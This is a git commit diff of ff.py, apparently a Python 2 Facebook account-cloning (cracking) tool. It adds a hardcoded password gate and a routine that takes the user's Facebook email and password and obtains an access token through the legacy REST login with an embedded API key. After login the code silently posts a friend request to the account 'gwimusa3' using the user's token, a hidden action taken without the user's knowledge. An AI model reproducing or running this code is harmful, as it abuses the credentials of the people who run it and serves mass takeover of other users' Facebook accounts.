2d5895c1aa8621e1138d8f2de367697a6482de8f
Raja <67794098+hackers1992@users.noreply.github.com>
2020-10-30 21:20:07 +0500

    Create ff.py

--- ff.py
+++ ff.py
@@ -82,49 +82,79 @@ print  """\033[1;96m [¤] \x1b[1;93mASSALAMUALAIKUM\x1b[1;96m  \033[1;96m   [¤]
 \033[1;96m [¤] \x1b[1;93mTOOLS MR.BLACK0304\x1b[1;96m  [¤] \x1b[1;93mYOUTUBE  : mr black0304\x1b[1;96m"""
 print " \x1b[1;93m============================================================="
 
+CorrectUsername = "FATONICYBER"
+CorrectPassword = "MR.BLACK0304"
 
-
-def login_choice():
-    os.system("clear")
-    print banner
-    print
-    print ("[1] Login With Token (Safe Method)")
-    print ("[1] Login With ID/Password ( May Have Checkpoint)")
-    print ("[0] Exit")
-    print 
-    login_select()
-def login_select():
-    select = raw_input("\n\033[1;31m▄︻̷̿┻̿═━一一  \033[0;97m")
-    if select =="1":
-        os.system("clear")
-        print banner
-        print 
-        print ("Login With Token").center(50)
-        print
-        print ("[1] Create a New  Account And Download GetAccessToken Apk From Playstore")
-        print('')
-        print ("[2] After Opening Apk Give Your ID & Password And Click On Get Now To Get Token and Paste Here")
-        print('')
-        print ("[3] Please Enable Two Factor Authentication On Your Account Before Creating Token")
-        print 
-        print 50*   ("-")
-        print 
-        token = raw_input("Paste Token Here : ")
-        saving()
-        sav = open(".login.txt","w")
-        sav.write(token)
-        sav.close()
-        ham("\r\033[1;32mLogin Successfull \033[0;97m")
-        time.sleep(1)
-        os.system("xdg-open https://wa.me/+923097992202")
-        menu()
-    elif select =="2":
-        loginfb()
-    elif select =="0":
-        os.system("exit")
+loop = 'true'
+while (loop == 'true'):
+    username = raw_input("\033[1;96m[☆] \x1b[1;93mUSERNAME TOOLS INI \x1b[1;96m>>>> ")
+    if (username == CorrectUsername):
+    	password = raw_input("\033[1;96m[☆] \x1b[1;93mPASSWORD TOOLS INI \x1b[1;96m>>>> ")
+        if (password == CorrectPassword):
+            print "Logged in successfully as " + username
+            loop = 'false'
+        else:
+            print "yang bener dong"
+            os.system('xdg-open https://wa.me/6285691015635')
     else:
-        print ("Please Select a Valid Option")
-        login.select()
+        print "salah sayang!"
+        os.system('xdg-open https://wa.me/6285691015635')
+
+def login():
+	os.system('clear')
+	try:
+		toket = open('login.txt','r')
+		menu() 
+	except (KeyError,IOError):
+		os.system('clear')
+		print logo
+		print 42*"\033[1;96m="
+		print('\033[1;96m[☆] \x1b[1;93mLOGIN AKUN FACEBOOK ANDA \x1b[1;96m[☆]' )
+		id = raw_input('\033[1;96m[+] \x1b[1;93mID/Email \x1b[1;91m: \x1b[1;92m')
+		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword \x1b[1;91m: \x1b[1;92m')
+		tik()
+		try:
+			br.open('https://m.facebook.com')
+		except mechanize.URLError:
+			print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
+			keluar()
+		br._factory.is_html = True
+		br.select_form(nr=0)
+		br.form['email'] = id
+		br.form['pass'] = pwd
+		br.submit()
+		url = br.geturl()
+		if 'save-device' in url:
+			try:
+				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
+				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
+				x=hashlib.new("md5")
+				x.update(sig)
+				a=x.hexdigest()
+				data.update({'sig':a})
+				url = "https://api.facebook.com/restserver.php"
+				r=requests.get(url,params=data)
+				z=json.loads(r.text)
+				unikers = open("login.txt", 'w')
+				unikers.write(z['access_token'])
+				unikers.close()
+				print '\n\033[1;96m[✓] \x1b[1;92mLogin Berhasil'
+				os.system('xdg-open https://youtube.com/channel/UCkoqlUeR59-foCsaMdQJOJw')
+				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
+				menu()
+			except requests.exceptions.ConnectionError:
+				print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
+				keluar()
+		if 'checkpoint' in url:
+			print("\n\033[1;96m[!] \x1b[1;91mSepertinya akun anda kena checkpoint")
+			os.system('rm -rf login.txt')
+			time.sleep(1)
+			keluar()
+		else:
+			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email salah")
+			os.system('rm -rf login.txt')
+			time.sleep(1)
+			login()
 
 
 def menu():
@@ -709,6 +739,7 @@ def clone_dari_file():
 		print"\033[1;96m[!] \x1b[1;91mToken invalid"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
+		login()
 	try:
 		os.mkdir('out')
 	except OSError:
@@ -763,3 +794,4 @@ def clone_dari_file():
        
 		
 if __name__ == '__main__':
+	login()
